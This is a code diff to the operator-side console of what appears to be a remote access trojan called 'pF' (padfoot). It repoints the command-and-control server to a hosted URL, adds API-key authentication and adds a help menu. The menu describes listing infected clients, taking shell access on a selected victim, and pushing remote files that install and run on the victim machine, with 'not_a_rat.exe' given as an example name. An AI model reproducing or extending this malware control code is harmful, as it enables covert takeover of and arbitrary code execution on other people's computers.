@@ -5,15 +5,49 @@ import json
 import os
 import public_ip as ip
 import platform
+from dotenv import load_dotenv
 
-SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us102.gitpod.io'
+load_dotenv()
+
+#SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us102.gitpod.io'
+SERVER = 'https://padfoot-server.onrender.com'
+API_KEY = os.environ["API_KEY"]
+
 # Connect to the Socket.IO server
 sio = socketio.Client()
 connected = False
 waiting = False
 selected_target = ""
 cached_clients = {}
+help_text = '''
+pF Help Menu
+Welcome to pF!
+Here are the basic commands:
+  
+"list":
+  lists connected clients as json. The key is the socket id.
+"set":
+  selects the client you wish to interact with. 
+  usage:
+    "pF >set 0FUUMOM2nm9YMkjVAAAi"
+    where "0FUUMOM2nm9YMkjVAAAi" is a socket id. 
+    Socket ids may be found through the "list" command.
+    To exit and deselect the client, type "EXIT" or restart the script.
+"shell":
+  Gives shell access to the client you have selected. To exit shell access, type "EXIT".
+  You need to select a client before using this command.
+"update":
+  Updates the client you have selected.
+  Parameters:
+    "update <url> <location> <name> <run> <is_script>"
 
+    url : The location of the updated file. "https://hosting.com/myfile.exe"
+    location : where to install this file on the client machine. (directory) "~/home/"
+    name : what should the file be classed on the client machine. "not_a_rat.exe"
+    run : should the file be run on update (will autodelete old file) "True" / "False"
+    is_script : is the new file an unbuilt python script. "True" / "False"
+
+'''
 def clear():
     # Check the operating system
     system = platform.system()
@@ -73,6 +107,7 @@ def shell():
                 case 'EXIT':
                     selected_target = ""
                     break
+                    continue
         match command:
             case 'list':
                 waiting = True
@@ -82,6 +117,8 @@ def shell():
             case 'set':
                 if command_list[1] in cached_clients:
                     selected_target = command_list[1]
+            case 'help':
+                print(help_text)
 
 @sio.on('establishmentResponse')
 def establishmentResponse(data):
@@ -114,7 +151,7 @@ def shellGetConnectedClientsResponse(data):
 
 @sio.on('connect')
 def on_connect():
-    data = {'client': False} 
+    data = {'client': False, 'apiKey': API_KEY} 
     sio.emit('establishment', data)
     
 
